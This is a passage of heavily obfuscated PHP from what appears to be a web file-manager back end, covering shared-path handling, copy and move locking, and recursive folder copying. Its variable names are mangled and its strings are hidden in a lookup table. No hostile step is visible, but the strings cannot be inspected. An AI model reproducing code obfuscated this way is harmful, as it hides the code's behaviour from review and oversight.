$Óİ¨à¥ø = '') { $this->_fileOut($ìóÍÁ·Ì, $…ç£¸¢, $ÊÚ”Şİ³, $Óİ¨à¥ø); } public function fileOutServer($îµÍì‰û, $ÂŠÁÙ³£ = false, $·ÓÈ§ùÀ = false, $‰Ğñ—°û = '') { $this->_fileOut($îµÍì‰û, $ÂŠÁÙ³£, $·ÓÈ§ùÀ, $‰Ğñ—°û, !0); } protected function _fileOutImage($†¾£§, $Ş¦ÌïŞø = 250) { $Õâ™—ºÄ =& $_SERVER[¿ÈˆÑ¸ä]; $Š¢°Ôí« = $this->model->pathInfo($†¾£§); if ($Š¢°Ôí«[$Õâ™—ºÄ[496]] == $Õâ™—ºÄ[91]) { show_json($Õâ™—ºÄ[1474] . $†¾£§, !1); } $ÅÛ°ëİ = $this->model->fileInfoGet($†¾£§); $Š¢°Ôí«[$Õâ™—ºÄ[182]] = $ÅÛ°ëİ[$Õâ™—ºÄ[87]]; $GLOBALS[$Õâ™—ºÄ[181]] = $Š¢°Ôí«; IO::fileOutImage($ÅÛ°ëİ[$Õâ™—ºÄ[87]], $Ş¦ÌïŞø); } public function fileOutImage($²Ò‚‚³û, $ú¾¬œÈš = 250) { $this->_fileOutImage($²Ò‚‚³û, $ú¾¬œÈš); } public function fileOutImageServer($èˆ¯•¸ñ, $ë•şµÑ = 250) { $this->_fileOutImage($èˆ¯•¸ñ, $ë•şµÑ); } public function link($«¸åıï, $ŠÌíçÄÑ = '') { $”ºÏÅƒÔ = $this->model->fileInfoGet($«¸åıï); return IO::link($”ºÏÅƒÔ[$_SERVER[¿ÈˆÑ¸ä][87]], $ŠÌíçÄÑ); } protected function parse($öú’»«¢) { $óé…’Â‡ =& $_SERVER[¿ÈˆÑ¸ä]; if (strstr($öú’»«¢, $óé…’Â‡[8]) === !1) { return array($óé…’Â‡[504] => intval($öú’»«¢), $óé…’Â‡[87] => $óé…’Â‡[12], $óé…’Â‡[1470] => array()); } $Î…â“ñø = explode($óé…’Â‡[8], trim($öú’»«¢, $óé…’Â‡[8])); if (count($Î…â“ñø) < 2) { show_tips(clear_html($öú’»«¢) . $óé…’Â‡[1475]); } return array($óé…’Â‡[504] => intval($Î…â“ñø[0]), $óé…’Â‡[87] => $Î…â“ñø[1], $óé…’Â‡[1470] => array_slice($Î…â“ñø, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($™°›öÓÜ) { $this->pathParse = $™°›öÓÜ; $this->model = Model($_SERVER[¿ÈˆÑ¸ä][1469]); } public function getPathRoot() { $Û°ø¥ñß =& $_SERVER[¿ÈˆÑ¸ä]; return KodIO::makeShare($this->pathParse[$Û°ø¥ñß[483]], $this->pathParse[$Û°ø¥ñß[1293]]); } public function getPathOuter($×˜ñèœ§) { $şÄ‹æÙ¥ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$×˜ñèœ§) { return $×˜ñèœ§; } $Áš”ğËÓ = $this->parse($×˜ñèœ§); return trim(KodIO::makeShare($this->pathParse[$şÄ‹æÙ¥[483]], $Áš”ğËÓ[$şÄ‹æÙ¥[483]]), $şÄ‹æÙ¥[8]); } public function isParentOf($ˆÇªú, $ãÁµŸ°ë) { $ÊåÕ¶”Ì = IO::init($ãÁµŸ°ë); return $this->model->isParentOf($ˆÇªú, $ÊåÕ¶”Ì->path); } protected function infoParse($œÍı×¤, $¨È¢ó¿‰ = false, $‡Óí¨ï = false) { $¨×µ™Éò =& $_SERVER[¿ÈˆÑ¸ä]; static $Œ¼á—™ = array(); $Ø‰Õø°ù = $this->pathParse[$¨×µ™Éò[483]]; $¾·ğÀ“³ = trim($this->pathParse[$¨×µ™Éò[1289]], $¨×µ™Éò[8]); if (isset($Œ¼á—™[$¾·ğÀ“³]) && is_array($Œ¼á—™[$¾·ğÀ“³])) { return $Œ¼á—™[$¾·ğÀ“³]; } $ˆ¨½úâÔ = Action($¨×µ™Éò[1476])->sharePathInfo($Ø‰Õø°ù, $¾·ğÀ“³, $¨È¢ó¿‰); $Œ¼á—™[$¾·ğÀ“³] = $ˆ¨½úâÔ; return $ˆ¨½úâÔ; } public function infoFull($—Ï«ÇĞÇ) { $ã©“¿Ïà =& $_SERVER[¿ÈˆÑ¸ä]; $”¡ˆ¼“‡ = explode($ã©“¿Ïà[8], trim($—Ï«ÇĞÇ, $ã©“¿Ïà[8])); if (count($”¡ˆ¼“‡) > 1) { $²­÷¥ú = implode($ã©“¿Ïà[8], array_splice($”¡ˆ¼“‡, 1)); $õÊ”ÎÕ½ = $this->model->pathInfoByPath($”¡ˆ¼“‡[0], $²­÷¥ú); if (!$õÊ”ÎÕ½) { return !1; } $this->pathParse[$ã©“¿Ïà[1289]] = $õÊ”ÎÕ½[$ã©“¿Ïà[192]]; } return $this->infoParse($—Ï«ÇĞÇ); } public function listAll($ï¤¥­¥) { $üŞñïĞ£ =& $_SERVER[¿ÈˆÑ¸ä]; $…°óìŠÚ = IO::info($this->pathParse[$üŞñïĞ£[87]]); if (!$…°óìŠÚ) { return array(); } $ÙÆî¬¸ = $this->model->listAll($ï¤¥­¥); $¶Êµ¨šš = Model($üŞñïĞ£[683])->getInfo($…°óìŠÚ[$üŞñïĞ£[684]]); foreach ($ÙÆî¬¸ as &$˜Èš³ÀŸ) { check_abort(); $˜Èš³ÀŸ[$üŞñïĞ£[90]] = Action($üŞñïĞ£[1476])->_shareItemeParse($˜Èš³ÀŸ[$üŞñïĞ£[90]], $¶Êµ¨šš); } unset($˜Èš³ÀŸ); return $ÙÆî¬¸; } } goto B‡¤³İˆ§Ÿ; dËÓ™¸‘íã: class SourceListMoveModel extends SourceListModel { public $allowLockSource = 1; public $moveClearAuth = true; public function allowLock() { return $this->allowLockSource; } public function lockCopyStart($‘»Äåûô) { $¡½œãˆİ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->allowLock()) { return; } $this->_lockCheck($¡½œãˆİ[637], $‘»Äåûô); $ì’Ç£ç = 1; $this->_lockEvent($‘»Äåûô, array($¡½œãˆİ[638], $¡½œãˆİ[639]), $ì’Ç£ç); $this->_lockParent($‘»Äåûô, array($¡½œãˆİ[639]), $ì’Ç£ç); $this->_lockEvent($‘»Äåûô, array($¡½œãˆİ[640], $¡½œãˆİ[641]), $ì’Ç£ç); $this->_lockCheckEnd($¡½œãˆİ[637], $‘»Äåûô); } public function lockCopyEnd($‡Œ…º®) { $¥ƒü˜Ú =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->allowLock()) { return; } $Ğ¼àãò‚ = 0; $this->_lockEvent($‡Œ…º®, array($¥ƒü˜Ú[638], $¥ƒü˜Ú[639]), $Ğ¼àãò‚); $this->_lockParent($‡Œ…º®, array($¥ƒü˜Ú[639]), $Ğ¼àãò‚); $this->_lockEvent($‡Œ…º®, array($¥ƒü˜Ú[640], $¥ƒü˜Ú[641]), $Ğ¼àãò‚); } public function lockWriteStart($»¦¤‹†¢, $¡±®ì« = '') { $²÷‚Í¥¸ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->allowLock()) { return; } $this->_lockCheck($²÷‚Í¥¸[638], $»¦¤‹†¢); $ú³§ÅÅ• = 1; $this->_lockKey($²÷‚Í¥¸[642] . $»¦¤‹†¢ . $²÷‚Í¥¸[10] . $¡±®ì«, $ú³§ÅÅ•); $this->_lockEvent($»¦¤‹†¢, array($²÷‚Í¥¸[637], $²÷‚Í¥¸[639]), $ú³§ÅÅ•); $this->_lockParent($»¦¤‹†¢, array($²÷‚Í¥¸[637], $²÷‚Í¥¸[639]), $ú³§ÅÅ•); $this->_lockCheckEnd($²÷‚Í¥¸[638], $»¦¤‹†¢); } public function lockWriteEnd($”øÍëÒ, $²…ûµ² = '') { $™éºéÉß =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->allowLock()) { return; } $•½¡Ğ¿˜ = 0; $this->_lockKey($™éºéÉß[642] . $”øÍëÒ . $™éºéÉß[10] . $²…ûµ², $•½¡Ğ¿˜); $this->_lockEvent($”øÍëÒ, array($™éºéÉß[637], $™éºéÉß[639]), $•½¡Ğ¿˜); $this->_lockParent($”øÍëÒ, array($™éºéÉß[637], $™éºéÉß[639]), $•½¡Ğ¿˜); } public function lockMoveStart($ôã¶İ„) { $œÈŸ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->allowLock()) { return; } $this->_lockCheck($œÈŸ[639], $ôã¶İ„); $áªàüÈ€ = 1; $this->_lockKey($œÈŸ[643] . $ôã¶İ„, $áªàüÈ€); $this->_lockEvent($ôã¶İ„, array($œÈŸ[637], $œÈŸ[638]), $áªàüÈ€); $this->_lockParent($ôã¶İ„, array($œÈŸ[637], $œÈŸ[639]), $áªàüÈ€); $this->_lockEvent($ôã¶İ„, array($œÈŸ[644], $œÈŸ[640], $œÈŸ[641]), $áªàüÈ€); $this->_lockCheckEnd($œÈŸ[639], $ôã¶İ„); } public function lockMoveEnd($ÊŠÍÅê×) { $¸âĞ‚ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->allowLock()) { return; } $üâÇÁÅ‡ = 0; $this->_lockKey($¸âĞ‚[643] . $ÊŠÍÅê×, $üâÇÁÅ‡); $this->_lockEvent($ÊŠÍÅê×, array($¸âĞ‚[637], $¸âĞ‚[638]), $üâÇÁÅ‡); $this->_lockParent($ÊŠÍÅê×, array($¸âĞ‚[637], $¸âĞ‚[639]), $üâÇÁÅ‡); $this->_lockEvent($ÊŠÍÅê×, array($¸âĞ‚[644], $¸âĞ‚[640], $¸âĞ‚[641]), $üâÇÁÅ‡); } private function _lockCheck($ãË—³Õ, $ş×›í«¬) { $¦¸Åñ‘´ =& $_SERVER[¿ÈˆÑ¸ä]; $úò•û = $this->sourceInfo($ş×›í«¬); $Şæ±²¯î = $ãË—³Õ . $¦¸Åñ‘´[10] . $ş×›í«¬; $this->_lockTimeStart[$Şæ±²¯î] = timeFloat(); if (!is_array($úò•û)) { return; } $÷­ˆ½µà = LNG($¦¸Åñ‘´[645]); CacheLock::setErrorMsg($¦¸Åñ‘´[174] . htmlspecialchars($úò•û[$¦¸Åñ‘´[32]]) . $¦¸Åñ‘´[176] . $÷­ˆ½µà); $this->_lockKey($Şæ±²¯î, 1); $this->_lockKey($Şæ±²¯î, 0); $Á›¡éÊã = array_reverse($this->parentLevelArray($úò•û[$¦¸Åñ‘´[600]])); foreach ($Á›¡éÊã as $¸ÌŒıøª) { $Şæ±²¯î = $ãË—³Õ . $¦¸Åñ‘´[646] . $¸ÌŒıøª; if (CacheLock::lockGet($¦¸Åñ‘´[647] . $Şæ±²¯î)) { $úò•û = $this->sourceInfo($¸ÌŒıøª); CacheLock::setErrorMsg($¦¸Åñ‘´[174] . htmlspecialchars($úò•û[$¦¸Åñ‘´[32]]) . $¦¸Åñ‘´[176] . $÷­ˆ½µà); $this->_lockKey($Şæ±²¯î, 1); $this->_lockKey($Şæ±²¯î, 0); } } } private function _lockCheckEnd($äÏåáè¿, $¡¯ô¦ÔÙ) { $Å•¤¾ˆó =& $_SERVER[¿ÈˆÑ¸ä]; $êŸ«±± = $äÏåáè¿ . $Å•¤¾ˆó[10] . $¡¯ô¦ÔÙ; CacheLock::setErrorMsg($Å•¤¾ˆó[463]); if (!isset($this->_lockTimeStart[$êŸ«±±])) { return; } $¡‹æáûÛ = timeFloat() - $this->_lockTimeStart[$êŸ«±±]; unset($this->_lockTimeStart[$êŸ«±±]); if ($¡‹æáûÛ > 0.5) { unset(self::$cacheSourceInfo[$Å•¤¾ˆó[543] . $¡¯ô¦ÔÙ]); } $óÃĞñÛİ = $this->sourceInfo($¡¯ô¦ÔÙ); if (!$óÃĞñÛİ) { show_json(LNG($Å•¤¾ˆó[106]), !1); } } private function _lockParent($ó™˜Çø, $âà°ƒõÈ, $ÌöÌ½•‡) { if (!$this->autoLockSet) { return; } $ø²›üëô = $this->sourceInfo($ó™˜Çø); if (!is_array($ø²›üëô)) { return; } $Ôİ§‚¤ = array_reverse($this->parentLevelArray($ø²›üëô[$_SERVER[¿ÈˆÑ¸ä][600]])); foreach ($Ôİ§‚¤ as $Ô†´Ü’‹) { $this->_lockEvent($Ô†´Ü’‹, $âà°ƒõÈ, $ÌöÌ½•‡); } } private function _lockEvent($ÛŠÂÀÆ, $í±í«Í®, $Ş¯ÑªÒî) { $ç¥ÖÖÂÕ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$this->autoLockSet) { return; } foreach ($í±í«Í® as $ğ¦¤… ó) { $ÉùàÄ¡Ø = $ğ¦¤… ó . $ç¥ÖÖÂÕ[10] . $ÛŠÂÀÆ; if ($Ş¯ÑªÒî && CacheLock::lockGet($ç¥ÖÖÂÕ[647] . $ÉùàÄ¡Ø)) { continue; } $this->_lockKey($ÉùàÄ¡Ø, $Ş¯ÑªÒî); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($À©“Å¶™, $àôë™ô = 1) { $ÁÃ‚Ê—ß = $_SERVER[¿ÈˆÑ¸ä][647] . md5($À©“Å¶™); if ($àôë™ô) { if (isset(self::$_lockItemArr[$ÁÃ‚Ê—ß])) { return; } self::$_lockItemArr[$ÁÃ‚Ê—ß] = 1; CacheLock::lock($ÁÃ‚Ê—ß, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$ÁÃ‚Ê—ß])) { return; } unset(self::$_lockItemArr[$ÁÃ‚Ê—ß]); CacheLock::unlock($ÁÃ‚Ê—ß); } } public function isParentOf($ª©ç¡µ´, $÷æü†æ) { $÷ˆğ¿ãˆ =& $_SERVER[¿ÈˆÑ¸ä]; $ÂÅŒ“öİ = $this->sourceInfo($ª©ç¡µ´); $£å½¬íÊ = $this->sourceInfo($÷æü†æ); $º‡áß® = $ÂÅŒ“öİ[$÷ˆğ¿ãˆ[600]] . $ÂÅŒ“öİ[$÷ˆğ¿ãˆ[192]] . $÷ˆğ¿ãˆ[50]; $ã°’‚È = $£å½¬íÊ[$÷ˆğ¿ãˆ[600]] . $£å½¬íÊ[$÷ˆğ¿ãˆ[192]] . $÷ˆğ¿ãˆ[50]; $¾İÀï¦µ = strpos($ã°’‚È, $º‡áß®) === 0; return $¾İÀï¦µ; } private $targetIsDelete = 0; public function copy($¾Ïƒä½”, $ãê†Ìš, $•À‰‹³¸ = REPEAT_REPLACE, $—Ü™±öì = '') { $’ì”¦Ù¿ =& $_SERVER[¿ÈˆÑ¸ä]; $ú½Œ‡©õ = $this->sourceInfo($¾Ïƒä½”); $¹¿ÈøÙ‚ = $this->sourceInfo($ãê†Ìš); if (!$ú½Œ‡©õ || !$¹¿ÈøÙ‚ || $¹¿ÈøÙ‚[$’ì”¦Ù¿[496]] != $’ì”¦Ù¿[91]) { return !1; } if ($this->isParentOf($¾Ïƒä½”, $ãê†Ìš)) { return !1; } $ÓİŒ·õ = $—Ü™±öì ? $—Ü™±öì : $ú½Œ‡©õ[$’ì”¦Ù¿[32]]; $this->lockCopyStart($¾Ïƒä½”); $this->lockWriteStart($ãê†Ìš, $ÓİŒ·õ); $Ää¶­õÒ = array($’ì”¦Ù¿[648] => array(), $’ì”¦Ù¿[649] => array(), $’ì”¦Ù¿[650] => array()); $this->targetIsDelete = intval($ú½Œ‡©õ[$’ì”¦Ù¿[516]]); $íÁÛ»ñ‡ = $this->fileNameExistAuto($ãê†Ìš, $ú½Œ‡©õ); $Ú´¨˜£õ = $this->_copy($¾Ïƒä½”, $ãê†Ìš, $•À‰‹³¸, $Ää¶­õÒ, !0, $—Ü™±öì); $this->_childrenListClear(); $this->lockCopyEnd($¾Ïƒä½”); $this->lockWriteEnd($ãê†Ìš, $ÓİŒ·õ); if ($ú½Œ‡©õ[$’ì”¦Ù¿[496]] == $’ì”¦Ù¿[91] && $íÁÛ»ñ‡ == $Ú´¨˜£õ) { $this->folderSizeResetChildren($íÁÛ»ñ‡); } Model($’ì”¦Ù¿[651])->addAll($Ää¶­õÒ[$’ì”¦Ù¿[649]], array(), !0); if ($íÁÛ»ñ‡ != $Ú´¨˜£õ || $ú½Œ‡©õ[$’ì”¦Ù¿[496]] == $’ì”¦Ù¿[91]) { Model($’ì”¦Ù¿[652])->eventCopy($Ú´¨˜£õ); } $this->saveAll($Ää¶­õÒ[$’ì”¦Ù¿[650]]); Model($’ì”¦Ù¿[231])->linkAdd($Ää¶­õÒ[$’ì”¦Ù¿[648]]); $this->folderSizeReset($ãê†Ìš); $this->updateModifyTime($ãê†Ìš); return $Ú´¨˜£õ; } private function _copy($Ã©îô¦®, $‘ØôªóŸ, $º–¶©÷Š, &$Ä£ÚŸŠ, $‰œ˜Î ø, $·‰ÉìÇ = '') { $úÎñ‡Õß =& $_SERVER[¿ÈˆÑ¸ä]; $œ×¶Ñ = $this->sourceInfoCache($Ã©îô¦®); $ü™†ï = $œ×¶Ñ[$úÎñ‡Õß[496]] == $úÎñ‡Õß[91]; $÷ÊİÍƒ± = $·‰ÉìÇ ? $·‰ÉìÇ : $œ×¶Ñ[$úÎñ‡Õß[32]]; $æ§Â¨° = $this->fileNameExistAuto($‘ØôªóŸ, $œ×¶Ñ); if ($‰œ˜Î ø) { $this->_childrenAllMake($Ã©îô¦®); if ($ü™†ï && $æ§Â¨°) { $this->_childrenAllMake($æ§Â¨°); } } if (!$æ§Â¨°) { return $this->_copyCreate($Ã©îô¦®, $‘ØôªóŸ, $÷ÊİÍƒ±, $Ä£ÚŸŠ); } $ŞáÙôÒ = $æ§Â¨°; if ($ü™†ï) { if ($º–¶©÷Š == REPEAT_RENAME_FOLDER) { $÷ÊİÍƒ± = $this->fileNameAutoCache($‘ØôªóŸ, $÷ÊİÍƒ±, $º–¶©÷Š, $ü™†ï); $ŞáÙôÒ = $this->_copyCreate($Ã©îô¦®, $‘ØôªóŸ, $÷ÊİÍƒ±, $Ä£ÚŸŠ); } else { $ãŸÑŸ·˜ = $this->_childrenList($Ã©îô¦®); foreach ($ãŸÑŸ·˜ as $Õµ…ÍÊ‹) { $this->_copy($Õµ…ÍÊ‹[$úÎñ‡Õß[192]], $æ§Â¨°, $º–¶©÷Š, $Ä£ÚŸŠ, !1); } } } else { if ($º–¶©÷Š == REPEAT_RENAME || $º–¶©÷Š == REPEAT_RENAME_FOLDER) { $÷ÊİÍƒ± = $this->fileNameAutoCache($‘ØôªóŸ, $÷ÊİÍƒ±, $º–¶©÷Š, $ü™†ï); $ŞáÙôÒ = $this->_copyCreate($Ã©îô¦®, $‘ØôªóŸ, $÷ÊİÍƒ±, $Ä£ÚŸŠ); } else { if ($º–¶©÷Š == REPEAT_REPLACE) { $ÍÇĞªø¼ = $this->sourceInfoCache($æ§Â¨°); $ÉèüíÁ¼ = $this->fileHistory($ÍÇĞªø¼, $œ×¶Ñ[$úÎñ‡Õß[553]], $œ×¶Ñ[$úÎñ‡Õß[79]]); if ($ÉèüíÁ¼) { $Ä£ÚŸŠ[$úÎñ‡Õß[648]][] = $œ×¶Ñ[$úÎñ‡Õß[553]]; } } else { if ($º–¶©÷Š == REPEAT_SKIP) { } } } Hook::trigger($úÎñ‡Õß[653], array($úÎñ‡Õß[654], $œ×¶Ñ, 0)); } return $ŞáÙôÒ; } private function _copyCreate($¥çş“², $‹’ğŸÆ, $”ƒœ‘¸Ğ, &$½Ï“Ì) { $˜†ü–ºÜ =& $_SERVER[¿ÈˆÑ¸ä]; $ğ¤À£’ = $this->sourceInfoCache($¥çş“²); $ë‚œ‰‹˜ = $this->sourceInfoCache($‹’ğŸÆ); $ÊÉÌÀò² = $this->_makeItemData($ğ¤À£’, $ë‚œ‰‹˜, $”ƒœ‘¸Ğ); Hook::trigger($˜†ü–ºÜ[655], $ÊÉÌÀò²); Hook::trigger($˜†ü–ºÜ[656], array($˜†ü–ºÜ[657], $ÊÉÌÀò², 0)); $à”œı‚Ï = $this->add($ÊÉÌÀò²); $îóÓ¶ë = array($˜†ü–ºÜ[192] => $à”œı‚Ï, $˜†ü–ºÜ[32] => $”ƒœ‘¸Ğ); $this->_copyApplyMeta($îóÓ¶ë, $½Ï“Ì); if ($ğ¤À£’[$˜†ü–ºÜ[496]] != $˜†ü–ºÜ[91]) { $½Ï“Ì[$˜†ü–ºÜ[648]][] = $ğ¤À£’[$˜†ü–ºÜ[553]]; return $à”œı‚Ï; } $×ÒÑ¿é³ = array(); $¡å–˜ê = array(); $this->_childrenListAll($¥çş“², $×ÒÑ¿é³); $äûĞªğ = count($×ÒÑ¿é³); if ($äûĞªğ == 0) { return $à”œı‚Ï; } $šñÏ‡‚¬ = $this->sourceInfo($à”œı‚Ï); foreach ($×ÒÑ¿é³ as $›¸ÖãòØ) { $Ñ Õ·‰© = $this->_makeItemData($›¸ÖãòØ, $šñÏ‡‚¬, $›¸ÖãòØ[$˜†ü–ºÜ[32]]); $Ñ Õ·‰©[$˜†ü–ºÜ[600]] = $›¸ÖãòØ[$˜†ü–ºÜ[600]]; $¡å–˜ê[] = $Ñ Õ·‰©; } $this->chunkEventSet($˜†ü–ºÜ[658], array($˜†ü–ºÜ[659], $ÊÉÌÀò², $äûĞªğ)); $this->addAll($¡å–˜ê, array(), !1); $ÒÑıĞ¹ô = $this->where(array($˜†ü–ºÜ[191] => $à”œı‚Ï))->select(); $¿àƒ²è¬ = $this->_childrenMakeRelation($×ÒÑ¿é³, $ÒÑıĞ¹ô); $¿àƒ²è¬[$¥çş“²] = $à”œı‚Ï; $Ú©´ªÖ„ = array(); $µù×Şºò = array(); foreach ($ÒÑıĞ¹ô as $›¸ÖãòØ) { $‹´ç£ã = $›¸ÖãòØ[$˜†ü–ºÜ[192]]; $ÇıĞÆó¤ = $this->_childrenMatch($¿àƒ²è¬, $›¸ÖãòØ, $šñÏ‡‚¬); $Ú©´ªÖ„[] = array($˜†ü–ºÜ[192], $‹´ç£ã, $˜†ü–ºÜ[191], $ÇıĞÆó¤[$˜†ü–ºÜ[191]]); $µù×Şºò[] = array($˜†ü–ºÜ[192], $‹´ç£ã, $˜†ü–ºÜ[600], $ÇıĞÆó¤[$˜†ü–ºÜ[600]]); $this->_copyApplyMeta($›¸ÖãòØ, $½Ï“Ì); if ($›¸ÖãòØ[$˜†ü–ºÜ[496]] != $˜†ü–ºÜ[91]) { $½Ï“Ì[$˜†ü–ºÜ[648]][] = $›¸ÖãòØ[$˜†ü–ºÜ[553]]; } } $this->chunkEventSet($˜†ü–ºÜ[660], array($˜†ü–ºÜ[661], $ÊÉÌÀò², $äûĞªğ)); $this->saveAll($Ú©´ªÖ„); $this->chunkEventSet($˜†ü–ºÜ[662], array($˜†ü–ºÜ[663], $ÊÉÌÀò², $äûĞªğ)); $this->saveAll($µù×Şºò); return $à”œı‚Ï; } private function _childrenMakeRelation($ÍÕô¥³ˆ, $ù‡»­•) { $øÄàáÛ€ =& $_SERVER[¿ÈˆÑ¸ä]; $ø¸ª­¥ˆ = array(); $™Ó·ßÕ = array(); foreach ($ÍÕô¥³ˆ as $Ş¸¸Òôˆ) { $ØÉŠ…Úø = $Ş¸¸Òôˆ[$øÄàáÛ€[32]] . $øÄàáÛ€[8] . $Ş¸¸Òôˆ[$øÄàáÛ€[600]]; $ø¸ª­¥ˆ[$ØÉŠ…Úø] = $Ş¸¸Òôˆ[$øÄàáÛ€[192]]; } foreach ($ù‡»­• as $Ş¸¸Òôˆ) { $ØÉŠ…Úø = $Ş¸¸Òôˆ[$øÄàáÛ€[32]] . $øÄàáÛ€[8] . $Ş¸¸Òôˆ[$øÄàáÛ€[600]]; $¬‹¯Ù€‘ = $ø¸ª­¥ˆ[$ØÉŠ…Úø]; $™Ó·ßÕ[$¬‹¯Ù€‘] = $Ş¸¸Òôˆ[$øÄàáÛ€[192]]; } return $™Ó·ßÕ; } private function _childrenMatch($ÏİÓÙ€, $İ¨æòŸœ, $Õì¹Ê–ô) { $…„…… Ã =& $_SERVER[¿ÈˆÑ¸ä]; $²¨î–‹ö = $Õì¹Ê–ô[$…„…… Ã[600]]; $êø·œº× = $this->parentLevelArray($İ¨æòŸœ[$…„…… Ã[600]]); foreach ($êø·œº× as $˜Àª¤²ó) { if (isset($ÏİÓÙ€[$˜Àª¤²ó])) { $²¨î–‹ö .= $ÏİÓÙ€[$˜Àª¤²ó] . $…„…… Ã[664]; } } $²¨î–‹ö = rtrim($²¨î–‹ö, $…„…… Ã[50]) . $…„…… Ã[50]; $­ß¸…Ó = $this->parentLevelArray($²¨î–‹ö); $è„¦ïöÑ = $­ß¸…Ó[count($­ß¸…Ó) - 1]; return array($…„…… Ã[191] => $è„¦ïöÑ, $…„…… Ã[600] => $²¨î–‹ö); } private function _makeItemData($ñûØ˜öõ, $¼üŠí‡, $ß´çõ˜) { $ëÑ›†Íå =& $_SERVER[¿ÈˆÑ¸ä]; $ŠÚİìÆ = array($ëÑ›†Íå[665] => $ñûØ˜öõ[$ëÑ›†Íå[496]], $ëÑ›†Íå[505] => $ß´çõ˜, $ëÑ›†Íå[666] => $ñûØ˜öõ[$ëÑ›†Íå[497]] ? $ñûØ˜öõ[$ëÑ›†Íå[497]] : $ëÑ›†Íå[12], $ëÑ›†Íå[554] => $ñûØ˜öõ[$ëÑ›†Íå[553]] ? $ñûØ˜öõ[$ëÑ›†Íå[553]] : 0, $ëÑ›†Íå[636] => $ñûØ˜öõ[$ëÑ›†Íå[79]] ? $ñûØ˜öõ[$ëÑ›†Íå[79]] : 0, $ëÑ›†Íå[667] => intval($¼üŠí‡[$ëÑ›†Íå[189]]), $ëÑ›†Íå[668] => intval($¼üŠí‡[$ëÑ›†Íå[585]]), $ëÑ›†Íå[669] => intval(USER_ID), $ëÑ›†Íå[670] => intval(USER_ID), $ëÑ›†Íå[488] => intval($¼üŠí‡[$ëÑ›†Íå[192]]), $ëÑ›†Íå[671] => $¼üŠí‡[$ëÑ›†Íå[600]] . $¼üŠí‡[$ëÑ›†Íå[192]] . $ëÑ›†Íå[50], $ëÑ›†Íå[509] => $ñûØ˜öõ[$ëÑ›†Íå[88]] ? $ñûØ˜öõ[$ëÑ›†Íå[88]] : time(), $ëÑ›†Íå[515] => 0, $ëÑ›†Íå[672] => $ëÑ›†Íå[12]); return $ŠÚİìÆ; } private function _copyApplyMeta($şîÅËöÖ, &$¥›ñğê¯) { $İŒÖ©¿Á =& $_SERVER[¿ÈˆÑ¸ä]; $ØØ †®ö = $şîÅËöÖ[$İŒÖ©¿Á[192]]; $Æ¦„ğœê = $şîÅËöÖ[$İŒÖ©¿Á[32]]; if (!isset($şîÅËöÖ[$İŒÖ©¿Á[673]]) || !$şîÅËöÖ[$İŒÖ©¿Á[673]] || $şîÅËöÖ[$İŒÖ©¿Á[673]] == $İŒÖ©¿Á[229]) { $¥›ñğê¯[$İŒÖ©¿Á[650]][] = array($İŒÖ©¿Á[192], $ØØ †®ö, $İŒÖ©¿Á[673], short_id($ØØ †®ö)); } if (Input::check($Æ¦„ğœê, $İŒÖ©¿Á[674])) { $¥›ñğê¯[$İŒÖ©¿Á[649]][] = array($İŒÖ©¿Á[192] => $ØØ †®ö, $İŒÖ©¿Á[95] => $İŒÖ©¿Á[548], $İŒÖ©¿Á[451] => str_replace($İŒÖ©¿Á[53], $İŒÖ©¿Á[12], Pinyin::get($Æ¦„ğœê))); $¥›ñğê¯[$İŒÖ©¿Á[649]][] = array($İŒÖ©¿Á[192] => $ØØ †®ö, $İŒÖ©¿Á[95] => $İŒÖ©¿Á[547], $İŒÖ©¿Á[451] => Pinyin::get($Æ¦„ğœê, $İŒÖ©¿Á[675])); } $¥›ñğê¯[$İŒÖ©¿Á[649]][] = array($İŒÖ©¿Á[192] => $ØØ †®ö, $İŒÖ©¿Á[95] => $İŒÖ©¿Á[527], $İŒÖ©¿Á[451] => KodSort::makeStr($Æ¦„ğœê)); } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($éŒğĞÎ“) { $ËôéÔã =& $_SERVER[¿ÈˆÑ¸ä]; $¸êå·¬Û = $this->sourceInfo($éŒğĞÎ“); $î¬Ü‰òÀ = $ËôéÔã[676]; $Ä™Ù¹‡· = array($ËôéÔã[600] => array($ËôéÔã[631], $¸êå·¬Û[$ËôéÔã[600]] . $éŒğĞÎ“ . $ËôéÔã[632]), $ËôéÔã[516] => $this->targetIsDelete); $ÜŒÊÔ…ä = $this->field($î¬Ü‰òÀ)->where($Ä™Ù¹‡·)->select(); if (!$ÜŒÊÔ…ä) { return; } $ÜŒÊÔ…ä = array_to_keyvalue($ÜŒÊÔ…ä, $ËôéÔã[192]); foreach ($ÜŒÊÔ…ä as $œ®²ä®) { $óÁñÖ  = $œ®²ä®[$ËôéÔã[191]]; $éŒğĞÎ“ = $œ®²ä®[$ËôéÔã[192]]; if (!isset($this->_childrenListCache[$éŒğĞÎ“]) && $œ®²ä®[$ËôéÔã[496]] == $ËôéÔã[91]) { $this->_childrenListCache[$éŒğĞÎ“] = array(); } if (!isset($this->_childrenListCache[$óÁñÖ ])) { $this->_childrenListCache[$óÁñÖ ] = array(); } $this->_childrenListCache[$óÁñÖ ][$éŒğĞÎ“] = $œ®²ä®; $this->_childrenItemCache[$éŒğĞÎ“] = $œ®²ä®; } } private function _childrenListAll($ıÇõ¹İŸ, &$¹‹Ã…ºŒ) { $ªÍû¡ø =& $_SERVER[¿ÈˆÑ¸ä]; if (!isset($this->_childrenListCache[$ıÇõ¹İŸ])) { return; } $ÎÂ¿Á‚’ = $this->_childrenListCache[$ıÇõ¹İŸ]; foreach ($ÎÂ¿Á‚’ as $—ØÎÆä => $ÇÏ÷¤ì») { $¹‹Ã…ºŒ[$—ØÎÆä] = $ÇÏ÷¤ì»; if ($ÇÏ÷¤ì»[$ªÍû¡ø[496]] == $ªÍû¡ø[91]) { $this->_childrenListAll($—ØÎÆä, $¹‹Ã…ºŒ); } } } private function sourceInfoCache($•ö±†¼¶) { if 